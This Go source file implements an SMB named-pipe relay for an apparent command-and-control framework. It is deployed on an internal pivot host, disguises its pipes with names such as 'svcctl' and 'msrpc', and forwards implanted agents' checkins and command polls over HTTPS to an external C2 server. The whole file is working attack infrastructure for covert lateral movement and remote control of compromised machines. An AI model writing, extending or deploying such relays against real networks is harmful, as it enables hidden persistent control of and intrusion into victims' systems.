// smb_relay — Named pipe → HTTPS C2 relay.
//
// Deploy on an internal pivot host that:
//   • Accepts SMB connections from target agents (port 445)
//   • Has outbound HTTPS to the real C2 server
//
// The relay reads framed messages from the named pipe (pkg/transport/smb_windows.go
// framing) and proxies them to the C2 REST API, then writes the response back.
//
// Usage (Windows, run as administrator for named pipe creation):
//
//	smb_relay.exe --pipe svcctl --c2 https://c2.example.com --key SpookyOrcaC2AES1
//	smb_relay.exe --pipe msrpc  --c2 https://c2.example.com --port 8080
package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

// Frame constants (must match pkg/transport/smb_windows.go)
const (
	smbMagic    = uint32(0x54425550)
	smbFrameHdr = 9
	smbTypeData = uint8(0)
	smbTypePoll = uint8(1)
	smbTypeAck  = uint8(2)
)

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	procCreateNP      = kernel32.NewProc("CreateNamedPipeW")
	procConnectNP     = kernel32.NewProc("ConnectNamedPipe")
	procDisconnectNP  = kernel32.NewProc("DisconnectNamedPipe")
	procReadFile      = kernel32.NewProc("ReadFile")
	procWriteFile     = kernel32.NewProc("WriteFile")
	procCloseHandle   = kernel32.NewProc("CloseHandle")
)

const (
	pipeModeMsg        = 0x04 | 0x02 // PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE
	pipeAccess         = 0x00000003  // PIPE_ACCESS_DUPLEX
	invalidHandle      = ^uintptr(0)
	fileFlagOverlapped = 0x40000000
)

func main() {
	pipeName := flag.String("pipe", "svcctl", "Named pipe name (without \\\\.\\ prefix)")
	c2URL := flag.String("c2", "", "C2 server base URL (required)")
	encKey := flag.String("key", "", "AES encryption key (must match agent)")
	maxInst := flag.Int("instances", 10, "Max concurrent pipe instances")
	flag.Parse()

	if *c2URL == "" {
		fmt.Fprintln(os.Stderr, "[-] --c2 is required")
		os.Exit(1)
	}

	pipePath := fmt.Sprintf(`\\.\pipe\%s`, *pipeName)
	fmt.Printf("[*] SMB Relay starting\n")
	fmt.Printf("    Pipe  : %s\n", pipePath)
	fmt.Printf("    C2    : %s\n", *c2URL)

	relay := &Relay{
		pipePath: pipePath,
		c2URL:    *c2URL,
		encKey:   *encKey,
		maxInst:  *maxInst,
		client:   &http.Client{Timeout: 30 * time.Second},
	}
	if err := relay.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Relay error: %v\n", err)
		os.Exit(1)
	}
}

// Relay accepts named pipe connections and proxies frames to the C2 server.
type Relay struct {
	pipePath string
	c2URL    string
	encKey   string
	maxInst  int
	client   *http.Client
}

func (r *Relay) Run() error {
	for {
		h, err := r.createPipeInstance()
		if err != nil {
			return err
		}
		// ConnectNamedPipe blocks until a client connects
		procConnectNP.Call(h, 0)
		fmt.Printf("[+] Client connected\n")
		go r.handleConn(h)
	}
}

func (r *Relay) createPipeInstance() (uintptr, error) {
	path16, _ := syscall.UTF16PtrFromString(r.pipePath)
	h, _, err := procCreateNP.Call(
		uintptr(unsafe.Pointer(path16)),
		uintptr(pipeAccess),
		uintptr(pipeModeMsg),
		uintptr(r.maxInst),
		4096, 4096, // out/in buffer sizes
		0, 0,       // default timeout, default security
	)
	if h == invalidHandle {
		return 0, fmt.Errorf("CreateNamedPipe: %v", err)
	}
	return h, nil
}

func (r *Relay) handleConn(h uintptr) {
	defer func() {
		procDisconnectNP.Call(h)
		procCloseHandle.Call(h)
	}()

	hdr := make([]byte, smbFrameHdr)
	if err := pipeReadFull(h, hdr); err != nil {
		fmt.Printf("[!] Read header: %v\n", err)
		return
	}

	magic := binary.LittleEndian.Uint32(hdr[0:])
	if magic != smbMagic {
		fmt.Printf("[!] Bad magic: 0x%X\n", magic)
		return
	}
	msgType := hdr[4]
	length := binary.LittleEndian.Uint32(hdr[5:])

	var payload []byte
	if length > 0 {
		payload = make([]byte, length)
		if err := pipeReadFull(h, payload); err != nil {
			fmt.Printf("[!] Read payload: %v\n", err)
			return
		}
	}

	var respPayload []byte
	var apiErr error

	switch msgType {
	case smbTypeData:
		// Forward checkin/result to C2
		apiErr = r.proxyPost("/checkin", payload, &respPayload)

	case smbTypePoll:
		// sessionID is the payload — poll for command
		sessionID := string(payload)
		apiErr = r.proxyGet("/command/"+sessionID+"/next", &respPayload)

	default:
		fmt.Printf("[!] Unknown message type: %d\n", msgType)
		return
	}

	if apiErr != nil {
		fmt.Printf("[!] C2 proxy error: %v\n", apiErr)
		respPayload = nil
	}

	// Send ack frame back through the pipe
	ack := buildSMBFrame(smbTypeAck, respPayload)
	if err := pipeWrite(h, ack); err != nil {
		fmt.Printf("[!] Write ack: %v\n", err)
	}
}

func (r *Relay) proxyPost(path string, body []byte, out *[]byte) error {
	resp, err := r.client.Post(r.c2URL+"/api/v1"+path,
		"application/json", bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	*out = b
	return nil
}

func (r *Relay) proxyGet(path string, out *[]byte) error {
	resp, err := r.client.Get(r.c2URL + "/api/v1" + path)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	*out = b
	return nil
}

// ── Frame helpers ─────────────────────────────────────────────────────────────

func buildSMBFrame(msgType uint8, payload []byte) []byte {
	buf := make([]byte, smbFrameHdr+len(payload))
	binary.LittleEndian.PutUint32(buf[0:], smbMagic)
	buf[4] = msgType
	binary.LittleEndian.PutUint32(buf[5:], uint32(len(payload)))
	copy(buf[smbFrameHdr:], payload)
	return buf
}

func pipeReadFull(h uintptr, buf []byte) error {
	total := 0
	for total < len(buf) {
		var n uint32
		r, _, err := procReadFile.Call(
			h,
			uintptr(unsafe.Pointer(&buf[total])),
			uintptr(len(buf)-total),
			uintptr(unsafe.Pointer(&n)),
			0,
		)
		if r == 0 {
			return fmt.Errorf("ReadFile: %v", err)
		}
		if n == 0 {
			return io.ErrUnexpectedEOF
		}
		total += int(n)
	}
	return nil
}

func pipeWrite(h uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	var written uint32
	r, _, err := procWriteFile.Call(
		h,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r == 0 {
		return fmt.Errorf("WriteFile: %v", err)
	}
	return nil
}

// APIResponse is used only for JSON parsing in the relay.
type APIResponse struct {
	Success bool            `json:"success"`
	Data    json.RawMessage `json:"data,omitempty"`
	Error   string          `json:"error,omitempty"`
}
